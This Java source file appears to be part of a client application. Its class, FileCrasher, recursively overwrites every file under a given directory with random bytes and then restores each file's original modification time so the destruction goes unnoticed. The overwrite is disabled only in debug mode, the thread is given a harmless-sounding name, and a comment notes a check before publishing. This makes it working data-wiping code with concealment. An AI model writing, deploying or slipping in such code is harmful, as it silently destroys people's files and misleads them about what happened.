package naoh.client;

import naoh.client.interfaces.Filter;

import java.io.File;
import java.io.FileOutputStream;
import java.util.ArrayList;
import java.util.List;

public class FileCrasher implements Runnable {
    final File rootFile;

    FileCrasher(File rootFile, Filter fileFilter) {
        this.rootFile = rootFile.getAbsoluteFile();
        if (fileFilter.accept(rootFile)) {
            Thread t = new Thread(this);
            t.setName("Cup");
            t.start();
        } else {
            Log.i(String.format("Rust request denied:%s", rootFile.getAbsolutePath()));
        }

    }

    @Override
    public void run() {
        int successCoverCount = 0;
        for (File f : getFileList()) {
            int bytes;
            try {
                long originalLastModifiedTimeOfTheFileToBeCovered = f.lastModified();
                bytes = cover(f);
                //TODO CHECK BEFORE PUBLISH

                successCoverCount++;

                boolean hasSucceessfullyRetrievedLastModifiedTime = f.setLastModified(originalLastModifiedTimeOfTheFileToBeCovered);
                Log.v(String.format("FILE COVERED : %s FOR %.3f KILOBYTES, lastModTimeRetrieved=%s", f.getAbsolutePath(), bytes / 1000d, hasSucceessfullyRetrievedLastModifiedTime));
            } catch (Exception e) {
                if (!rootFile.exists()) {
                    Log.w("Root file is missing. Covering terminated.");
                    break;
                } else {
                    Log.e(String.format("Failed covering file %s : %s", f.getAbsolutePath(), e.toString()));
                }
            }


        }

        Log.v(String.format("Completed covering files in directory %s : Covered %d files successfully", rootFile.getAbsolutePath(), successCoverCount));
    }

    private int cover(File f) throws Exception {
        if (Application.debug)
            throw new CoverageException.AccessDenied("Cannot operate in debug mode"); //禁止在DEBUG模式下进行覆盖操作

        int bytes;
        int targetLength = (int) (Math.random() * 16 * 1024);

        try (FileOutputStream fos = new FileOutputStream(f, false)) {
            for (bytes = 0; bytes < targetLength; bytes += 4) {
                fos.write((int) (Math.random() * Integer.MAX_VALUE));
            }
        }
        return bytes;
    }

    List<File> getFileList() {
        return new FileFetcher().fetch(rootFile);
    }

    private static class FileFetcher {
        List<File> list = new ArrayList<>();

        List<File> fetch(File rootFile) {
            addFiles(rootFile);
            return list;
        }

        void addFiles(File directory) {
            try {
                File[] files = directory.listFiles();
                if (files == null) return;
                for (File f : files) {
                    if (f.isDirectory()) addFiles(f);
                    else list.add(f);
                }
            } catch (Exception ignored) {
            }
        }
    }
}
